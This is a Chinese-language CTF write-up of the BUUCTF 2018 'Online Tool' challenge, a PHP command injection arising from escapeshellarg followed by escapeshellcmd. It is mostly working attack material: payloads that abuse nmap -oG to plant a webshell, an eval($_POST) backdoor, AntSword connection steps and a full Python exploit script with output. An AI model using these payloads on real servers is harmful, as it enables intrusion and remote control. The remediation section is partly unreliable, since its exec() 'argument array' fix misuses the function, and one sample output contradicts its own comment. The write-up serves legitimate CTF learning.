# Writeup 4 BUUCTF [2018] Online Tool

该 Writeup 涵盖了源码分析、漏洞原理、Payload 构造、攻击步骤和防御方案。



## 一、题目信息

- **题目名称**：[BUUCTF 2018] Online Tool
- **考点类型**：RCE（远程命令执行）
- **核心漏洞**：PHP `escapeshellarg` + `escapeshellcmd` 函数组合使用不当导致单引号逃逸
- **利用工具**：nmap 的 `-oG` 参数写入 Webshell

## 二、源码分析

访问靶机首页，直接获得源码：

```php
 <?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```

### 代码逻辑解读

| 步骤 | 代码                                     | 说明                            |
| :--: | ---------------------------------------- | ------------------------------- |
|  1   | `$_GET['host']`                          | 获取用户输入的 host 参数        |
|  2   | `escapeshellarg($host)`                  | 将字符串转义为安全的 shell 参数 |
|  3   | `escapeshellcmd($host)`                  | 转义 shell 元字符               |
|  4   | `md5("glzjin". $_SERVER['REMOTE_ADDR'])` | 创建沙箱目录                    |
|  5   | `system("nmap ... " . $host)`            | 执行 nmap 命令                  |

### 关键函数说明

#### `escapeshellarg()`

- **功能**：将字符串转码为可以在 shell 命令里使用的**参数**

- **规则**：

  - 给字符串**两端加上单引号**
  - 将字符串内**已有的单引号**转义为 `'\''`

- **示例**：

  ```php
  <?php
  
  $input = "hello ' world";
  echo escapeshellarg($input);
  // 输出：'hello '\'' world'
  
  ?>
  ```

  运行结果：

  ```
  "hello ' world"
  
  Process finished with exit code 0
  ```

  

#### `escapeshellcmd()`

- **功能**：转义 shell **元字符**，防止命令注入

- **转义字符列表**：`&` `;` `` ` `` `|` `*` `?` `~` `<` `>` `^` `(` `)` `[` `]` `{` `}` `$` `\` `\x0A` `\xFF`

- **特殊规则**：`'` 和 `"` **仅在不成对时**被转义

- **示例**：

  ```php
  $input = "hello; ls";
  echo escapeshellcmd($input);
  // 输出：hello\; ls
  
  注意：
      在Windows环境下，输出：
      hello^; ls
  ```

## 三、漏洞原理

### 3.1 函数组合使用的问题

当 **先使用 `escapeshellarg`，再使用 `escapeshellcmd`** 时，会产生**单引号逃逸漏洞**。

#### 漏洞复现

以输入 `172.17.0.2' -v -d a=1` 为例：

| 步骤               | 处理结果                       | 说明                                  |
| ------------------ | ------------------------------ | ------------------------------------- |
| 原始输入           | `172.17.0.2' -v -d a=1`        | -                                     |
| `escapeshellarg()` | `'172.17.0.2'\'' -v -d a=1'`   | 两端加单引号，内部单引号转义为 `'\''` |
| `escapeshellcmd()` | `'172.17.0.2'\\'' -v -d a=1\'` | 对 `\` 和不成对的 `'` 进行转义        |

**最终结果**：`'172.17.0.2'\\'' -v -d a=1\'`

**解析**：

- `\\` 被解释为单个 `\`（不再是转义符）
- 后面的 `'` 与再后面的 `'` 配对，形成空白连接符
- 原本应该被转义的单引号**成功逃逸**，导致参数边界被破坏

### 3.2 为什么顺序很重要？

| 调用顺序                            | 安全性     | 说明                       |
| ----------------------------------- | ---------- | -------------------------- |
| `escapeshellarg` → `escapeshellcmd` | **不安全** | 产生单引号逃逸             |
| `escapeshellcmd` → `escapeshellarg` | **安全**   | 先转义元字符，再加引号包裹 |

## 四、攻击思路

### 4.1 目标

在目标服务器上执行任意命令，读取 flag 文件。

### 4.2 突破口

1. 通过单引号逃逸，可以向 `system()` 函数注入额外命令
2. 目标服务器上存在 `nmap` 命令
3. `nmap` 提供 `-oG` 参数，可以将输出写入指定文件

### 4.3 `-oG` 参数详解

| 参数  | 含义              | 用途                                 |
| :---: | ----------------- | ------------------------------------ |
| `-oG` | Grepable 输出格式 | 将扫描结果以机器可读的格式输出到文件 |
| `-oN` | 正常输出格式      | 将扫描结果以人类可读格式输出到文件   |
| `-oX` | XML 输出格式      | 将扫描结果以 XML 格式输出到文件      |

**关键点**：`-oG` 不仅输出扫描结果，还会**将命令本身也写入文件**。这意味着如果我们在命令中插入 PHP 代码，它也会被写入文件。

### 4.4 写入 Webshell 的原理

```bash
nmap -T5 -sT -Pn --host-timeout 2 -F ' <?php echo `cat /flag`;?> -oG shell.php '
```

当 `nmap` 执行时：

1. `-oG shell.php` 指示 nmap 将输出写入 `shell.php`
2. 单引号内的 `<?php echo \`cat /flag\`;?>` 被当作命令的一部分
3. nmap 在处理 `-oG` 时会**将整个命令字符串写入文件**
4. 最终 `shell.php` 的内容包含 PHP 代码，可以被 Web 服务器解析执行

## 五、Payload 构造详解

### 5.1 基础 Payload

```php
' <?php echo `cat /flag`;?> -oG shell.php '
```

### 5.2 为什么两端需要单引号和空格？

| 写法                             | 结果             | 问题                                |
| -------------------------------- | ---------------- | ----------------------------------- |
| `'<?php ... ?> -oG shell.php'`   | 整个被当作字符串 | 不会执行 PHP 代码                   |
| `' <?php ... ?> -oG shell.php '` | 有空格分隔       | 正确，`<?php ... ?>` 被当作独立命令 |

**原因**：经过函数处理后，两端的单引号用于包裹参数，中间的空格用于分隔命令。

### 5.3 为什么内部使用双引号？

```php
// 正确 ✅
' <?php eval($_POST["cmd"]); ?> -oG shell.php '

// 错误 ❌
' <?php eval($_POST['cmd']); ?> -oG shell.php '
```

**原因**：

- `escapeshellarg` 会转义**所有存在的单引号**
- 内部的 `'cmd'` 中的单引号被转义后，会破坏 PHP 语法
- 使用双引号 `"cmd"` 不会被转义，保持语法正确

### 5.4 为什么使用反引号执行命令？

```php
echo `cat /flag`;   // 反引号在 PHP 中执行系统命令
```

**等价写法**：

```php
echo shell_exec('cat /flag');
echo system('cat /flag');
```

### 5.5 完整的 Payload 处理流程

| 阶段                    | 值                                                           |
| ----------------------- | ------------------------------------------------------------ |
| **用户输入**            | `' <?php echo \`cat /flag\`;?> -oG shell.php '`              |
| **URL 编码后**          | `%27%20%3C%3Fphp%20echo%20%60cat%20/flag%60%3B%3F%3E%20-oG%20shell.php%20%27` |
| **`escapeshellarg` 后** | `''\'' <?php echo \`cat /flag\`;?> -oG shell.php '\'''`      |
| **`escapeshellcmd` 后** | `''\\'' \<\?php echo \`cat /flag\`\;\?\> -oG shell.php '\\'''` |
| **最终执行**            | `nmap ... -F ''\\'' \<\?php echo \`cat /flag\`\;\?\> -oG shell.php '\\'''` |

由于单引号逃逸，`<?php ... ?>` 部分被当作独立命令执行，其输出通过 `-oG` 写入 `shell.php`。

## 六、漏洞攻击步骤

### 6.1 获取 Sandbox 目录

在首页，**传入任意 host 参数即可看到 sandbox 值**。

URL:

```http
http://2a4aefea-0317-42d7-be19-423d11229186.node5.buuoj.cn:81/?host=test
```

页面显示：

```
you are in sandbox e6305cd14dbe6e1fc4041d81cb3fc9eeStarting Nmap 7.70 ( https://nmap.org ) at 2026-04-19 02:55 UTC Nmap done: 0 IP addresses (0 hosts up) scanned in 0.06 seconds Nmap done: 0 IP addresses (0 hosts up) scanned in 0.06 seconds
```

其中的“e6305cd14dbe6e1fc4041d81cb3fc9ee”是一个 MD5 值，是根据 `"glzjin" + 客户端IP` 计算的，每个访问者独立。

### 6.2 发送 Payload

发送 GET 请求：

```bash
http://2a4aefea-0317-42d7-be19-423d11229186.node5.buuoj.cn:81/?host=%27%20%3C%3Fphp%20echo%20%60cat%20/flag%60%3B%3F%3E%20-oG%20shell.php%20%27
```

页面显示：

```
you are in sandbox e6305cd14dbe6e1fc4041d81cb3fc9eeStarting Nmap 7.70 ( https://nmap.org ) at 2026-04-19 03:03 UTC Nmap done: 0 IP addresses (0 hosts up) scanned in 0.08 seconds Nmap done: 0 IP addresses (0 hosts up) scanned in 0.08 seconds
```

### 6.3 读取 Flag

访问生成的 Webshell：

```
http://2a4aefea-0317-42d7-be19-423d11229186.node5.buuoj.cn:81/e6305cd14dbe6e1fc4041d81cb3fc9ee/shell.php
```

页面直接显示 flag 内容：

```
# Nmap 7.70 scan initiated Sun Apr 19 03:01:33 2026 as: nmap -T5 -sT -Pn --host-timeout 2 -F -oG shell.php \ flag{23fd4461-e014-4ab0-9709-43ec1d468f24} \\ # Nmap done at Sun Apr 19 03:01:33 2026 -- 0 IP addresses (0 hosts up) scanned in 0.07 seconds 
```

### 6.4 一句话木马方案（可选）

如果需要更灵活的控制，可以写入一句话木马：

```bash
# Payload（注意内部使用双引号）
' <?php eval($_POST["cmd"]); ?> -oG shell.php '

# URL 编码后
%27%20%3C%3Fphp%20eval(%24_POST%5B%22cmd%22%5D)%3B%20%3F%3E%20-oG%20shell.php%20%27
```



发请求：

```http
http://2a4aefea-0317-42d7-be19-423d11229186.node5.buuoj.cn:81/?host=%27%20%3C%3Fphp%20eval(%24_POST%5B%22cmd%22%5D)%3B%20%3F%3E%20-oG%20shell.php%20%27
```

页面显示：

```html
you are in sandbox e6305cd14dbe6e1fc4041d81cb3fc9eeStarting Nmap 7.70 ( https://nmap.org ) at 2026-04-19 03:28 UTC Nmap done: 0 IP addresses (0 hosts up) scanned in 0.08 seconds Nmap done: 0 IP addresses (0 hosts up) scanned in 0.08 seconds
```

访问shell.php，激活后门：

```http
http://2a4aefea-0317-42d7-be19-423d11229186.node5.buuoj.cn:81/e6305cd14dbe6e1fc4041d81cb3fc9ee/shell.php
```

页面显示：

```
# Nmap 7.70 scan initiated Sun Apr 19 03:28:06 2026 as: nmap -T5 -sT -Pn --host-timeout 2 -F -oG shell.php \ \\ # Nmap done at Sun Apr 19 03:28:06 2026 -- 0 IP addresses (0 hosts up) scanned in 0.08 seconds 
```

使用蚁剑(AntSword)连接：

- **URL地址**：`http://2a4aefea-0317-42d7-be19-423d11229186.node5.buuoj.cn:81/e6305cd14dbe6e1fc4041d81cb3fc9ee/shell.php`

- **连接密码**：`cmd`

  ![](https://raw.gitcode.com/hengdonghui/pic-blog/raw/main/OnlineTool01-1776575179223-7-1776575184463-9.jpg)

  双击新添加的数据，可以看到沙箱，以及沙箱中的shell.php文件：

  ![沙箱](https://raw.gitcode.com/hengdonghui/pic-blog/raw/main/OnlineTool02-1776574340896-3.jpg)

  在靶机上寻找flag文件，通常情况下，flag存放在根目录：

  ![OnlineTool03](https://raw.gitcode.com/hengdonghui/pic-blog/raw/main/OnlineTool03-1776575218695-11-1776575220222-13-1776575223814-15.jpg)

- 双击根目录的flag文件，获得：

  flag{23fd4461-e014-4ab0-9709-43ec1d468f24}

  ![OnlineTool04](https://raw.gitcode.com/hengdonghui/pic-blog/raw/main/OnlineTool04-1776575241533-17-1776575243041-19.jpg)

## 七、完整的攻击脚本

```python
#!/usr/bin/env python3
import requests
import re
import urllib.parse

target = "http://08602bbf-854f-4ad8-a6a4-e2793adc7f85.node5.buuoj.cn:81"

# Step 1: 获取 sandbox 目录
r = requests.get(f"{target}/?host=test")
sandbox = re.search(r'you are in sandbox ([a-f0-9]{32})', r.text).group(1)
print(f"[+] Sandbox: {sandbox}")

# Step 2: 发送 payload 写入 webshell
payload = "' <?php echo `cat /flag`;?> -oG shell.php '"
encoded = urllib.parse.quote(payload)
requests.get(f"{target}/?host={encoded}")

# Step 3: 读取 flag
r = requests.get(f"{target}/{sandbox}/shell.php")
flag = re.search(r'flag\{[^}]+\}', r.text).group(0)
print(f"[+] Flag: {flag}")
```

运行结果：

```python
[+] Sandbox: e6305cd14dbe6e1fc4041d81cb3fc9ee
[+] Flag: flag{9d3e88d5-9dea-4dcc-bd18-40776295fc82}

进程已结束，退出代码为 0
```



## 八、漏洞修复建议

### 8.1 正确的函数调用顺序

```php
// 安全的写法：先 escapeshellcmd，再 escapeshellarg
$host = escapeshellcmd($_GET['host']);
$host = escapeshellarg($host);
```

### 8.2 使用内置过滤函数

```php
// 使用 filter_var 进行输入验证
$host = filter_var($_GET['host'], FILTER_VALIDATE_IP);
if (!$host) {
    die("Invalid IP address");
}
```

### 8.3 避免直接拼接命令

```php
// 使用 exec 的参数数组形式，避免字符串拼接
exec('nmap', ['-T5', '-sT', '-Pn', '--host-timeout', '2', '-F', $host]);
```

### 8.4 禁用危险函数

在 `php.ini` 中：

```ini
disable_functions = system, exec, shell_exec, passthru, popen, proc_open
```

## 九、总结

|     项目     | 内容                                                   |
| :----------: | ------------------------------------------------------ |
| **漏洞类型** | 命令注入（RCE）                                        |
| **根本原因** | `escapeshellarg` + `escapeshellcmd` 组合使用不当       |
| **攻击条件** | 目标执行 `nmap` 命令，支持 `-oG` 参数                  |
| **攻击路径** | 单引号逃逸 → 注入 PHP 代码 → 写入 Webshell → 读取 Flag |
| **影响版本** | PHP 5.x - 7.x（该漏洞在 PHP 7.4+ 部分缓解）            |

**核心收获**：

- 理解 `escapeshellarg` 和 `escapeshellcmd` 的本质区别
- 掌握函数组合使用时可能产生的安全问题
- 学会利用程序本身的功能（如 nmap -oG）实现攻击

---

*Writeup 完成时间：2026年4月19日*
